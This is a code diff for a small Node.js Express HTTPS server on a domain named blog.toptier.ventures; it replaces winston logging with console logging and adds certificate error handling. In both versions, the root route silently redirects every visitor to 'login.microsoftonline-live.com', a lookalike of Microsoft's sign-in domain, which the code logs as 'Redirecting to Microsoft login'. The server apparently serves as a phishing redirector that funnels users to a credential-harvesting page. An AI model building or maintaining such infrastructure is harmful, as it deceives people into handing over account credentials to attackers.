@@ -1,48 +1,41 @@
 const fs = require('fs');
 const https = require('https');
 const express = require('express');
-const winston = require('winston');
+
+console.log('Starting the application...');
 
 const app = express();
 
-const privateKey = fs.readFileSync('/etc/letsencrypt/live/toptier.ventures/privkey.pem', 'utf8');
-const certificate = fs.readFileSync('/etc/letsencrypt/live/toptier.ventures/fullchain.pem', 'utf8');
+let privateKey;
+let certificate;
+
+try {
+  privateKey = fs.readFileSync('/etc/letsencrypt/live/toptier.ventures/privkey.pem', 'utf8');
+  certificate = fs.readFileSync('/etc/letsencrypt/live/toptier.ventures/fullchain.pem', 'utf8');
+  console.log('Certificates loaded successfully');
+} catch (err) {
+  console.error('Error loading certificates:', err);
+  process.exit(1);
+}
+
 const credentials = { key: privateKey, cert: certificate };
 
-const port = 442; // Standard HTTPS port
-
-const logger = winston.createLogger({
-  level: 'info',
-  format: winston.format.json(),
-  transports: [
-    new winston.transports.File({ filename: '/path/to/logs/error.log', level: 'error' }),
-    new winston.transports.File({ filename: '/path/to/logs/combined.log' }),
-  ],
-});
-
-app.use((req, res, next) => {
-  logger.info(`Request received: ${req.method} ${req.url}`);
-  next();
-});
+const port = 442; // Ensure this port is open and not used by other services
 
 app.get('/', (req, res) => {
   setTimeout(() => {
+    console.log('Redirecting to Microsoft login');
     res.redirect('https://login.microsoftonline-live.com/secure');
   }, 10);
+});
+
+app.use((err, req, res, next) => {
+  console.error('Application error:', err.stack);
+  res.status(500).send('Something broke!');
 });
 
 const httpsServer = https.createServer(credentials, app);
 
 httpsServer.listen(port, '0.0.0.0', () => {
-  logger.info(`Proxy server listening at https://blog.toptier.ventures`);
-});
-
-process.on('uncaughtException', (err) => {
-  logger.error(`Uncaught Exception: ${err.message}`);
-  logger.error(err.stack);
-  process.exit(1);
-});
-
-process.on('unhandledRejection', (reason, promise) => {
-  logger.error('Unhandled Rejection at:', promise, 'reason:', reason);
+  console.log(`Proxy server listening at https://blog.toptier.ventures`);
 });
